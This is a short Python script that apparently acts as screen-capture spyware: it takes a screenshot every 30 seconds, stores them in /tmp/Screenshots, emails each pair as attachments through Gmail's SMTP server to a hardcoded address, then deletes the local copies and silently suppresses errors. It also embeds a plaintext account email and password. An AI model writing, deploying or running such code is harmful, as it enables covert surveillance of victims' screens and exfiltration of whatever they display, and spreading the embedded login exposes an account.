#!/usr/bin/env python3
print('line 2 screenshot')
import pyautogui
print('import pyautogui', flush = True)
import time
print('import time', flush = True)
import os
print('import os', flush = True)
import smtplib
print('import smtplib', flush = True)
import shutil
print('import shutil', flush = True)
from email.message import EmailMessage
print('import email', flush = True)

def send_mail():
    print('line 8 mail', flush = True)
    try:
        msg = EmailMessage()
        msg["From"] = "alimatt2007cyberft@gmail.com"
        msg["To"] = "alimatt2007cyberft@gmail.com"
        msg["Subject"] = "Screen_logs"
        body = "Screenshots"
        msg.set_content(body)
        images = os.listdir("Screenshots")
        path = "/tmp/Screenshots/"
        for image in images:
            file = open(path+image, "rb")
            data = file.read()
            file_name = file.name
            msg.add_attachment(data, maintype = "image", subtype = "png", filename = file_name)
            file.close()
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login("alimatt2007cyberft@gmail.com", "mynameisali1")
        server.send_message(msg)
        server.close()
        shutil.rmtree("Screenshots")

    except Exception as mail_error:
        shutil.rmtree("Screenshots")
        pass

count = 0
os.chdir("/tmp/")
if "Screenshots" in os.listdir("/tmp/"):
    print('line 39 dir')
    send_mail()
else:
    os.mkdir("/tmp/Screenshots")
while True:
    print('line 44 list')
    if "Screenshots" not in os.listdir("/tmp/"):
        os.mkdir("/tmp/Screenshots")
    pic = pyautogui.screenshot()
    pic.save("/tmp/Screenshots/screenshot_"+str(count)+".png")
    count += 1
    if count >= 2:
        send_mail()
        count = 0
    time.sleep(30)


        
